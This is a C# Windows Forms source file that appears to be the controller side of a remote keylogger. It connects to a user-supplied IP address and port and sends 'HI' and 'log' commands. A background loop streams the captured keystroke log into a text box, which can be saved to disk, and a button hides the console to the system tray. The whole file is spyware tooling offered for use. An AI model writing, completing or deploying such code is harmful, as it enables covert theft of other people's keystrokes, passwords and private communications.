using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.IO;
namespace ClientKey
{
    public partial class frmKeyLog : Form
    {
        public string strEOL = "H(#HRJ(DOE#";
        public Client client = new Client();
        public Timer timeGetLog = new Timer();
        public string checkold = "";
        public bool blConnected = false;
        public System.Threading.Thread newThreading;
        public bool blStarted;
        delegate void SetTextCallback(string text);

        private void SetText(string text)
        {
            // InvokeRequired required compares the thread ID of the
            // calling thread to the thread ID of the creating thread.
            // If these threads are different, it returns true.
            if (txtLog.InvokeRequired)
            {
                SetTextCallback d = new SetTextCallback(SetText);
                this.Invoke(d, new object[] { text });
            }
            else
            {
                txtLog.Text += text;
            }
        }
        public frmKeyLog()
        {
            
            
            
            
            InitializeComponent();
        }

        private void frmKeyLog_Load(object sender, EventArgs e)
        {
            blStarted = false;
            newThreading = new System.Threading.Thread(TickTimer1);
            
        }

        private void btnConnect_Click(object sender, EventArgs e)
        {
            client.StartClient(txtIpAdress.Text, int.Parse(txtPort.Text), txtMessage.Text);
            txtLog.Text += client.strDataTaken+"\n";
        }
        private void TickTimer1()
        {
            while (true)
            {
                client.text = txtLog;
                try
                {
                    client.startLog();
                }
                catch
                {
                    client.blLog = false;
                    timeGetLog.Stop();
                }
                if (client.strDataTaken != "" && client.strDataTaken != "\n" && client.strDataTaken != checkold)
                {
                    checkold = client.strDataTaken;
                    SetText(client.strDataTaken);
                }
            }
        }

        private void btnStopLog_Click(object sender, EventArgs e)
        {
            
            newThreading.Abort();
            client.senderPub.Close();
        }

        private void btnHideWindow_Click(object sender, EventArgs e)
        {
            this.Visible = false;
            noTicon.Visible = true;
            noTicon.ShowBalloonTip(100);

            
        }
        private void ShowForm(object sender, EventArgs e)
        {
            this.Visible = true;
        }

        private void noTicon_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            this.Visible = true;
        }

        private void lblSaveLog_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            FileDialog svFileDialog = new SaveFileDialog();
            svFileDialog.Filter="Text files (*.txt)|*.txt|All files (*.*)|*.*";
            svFileDialog.ShowDialog();
            if (svFileDialog.FileName != "") 
                File.WriteAllText(svFileDialog.FileName, txtLog.Text);
        }

        private void btnConncect_Click(object sender, EventArgs e)
        {
            if (!blConnected)
            {
                txtMessage.Text = "HI";
                client.StartClient(txtIpAdress.Text, int.Parse(txtPort.Text), txtMessage.Text);
                if (client.strDataTaken == "HI" + strEOL)
                {
                    btnConncect.Text = "Disconnect";
                    txtPort.Enabled = false;
                    txtIpAdress.Enabled = false;
                    blConnected = true;

                }
            }
                else 
                {
                    txtIpAdress.Enabled = true;
                    txtPort.Enabled = true;
                    blConnected = false;
                    btnConncect.Text = "&Connect";
                
                }
        
            }
        

        private void btnStart_Click(object sender, EventArgs e)
        {
            txtMessage.Text = "log";
            client.StartClient(txtIpAdress.Text, int.Parse(txtPort.Text), txtMessage.Text);
            newThreading = new System.Threading.Thread(TickTimer1);
                newThreading.Start();
          
           
        }
        private void DoJob()
        {
            if (blConnected)
            {

                if (client.blLog)
                {
                    timeGetLog.Start();
                    //timeGetLog.Tick += TickTimer1;
                }

            }
            else
                MessageBox.Show("Not Connected", "connection", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        
        }
    }
}
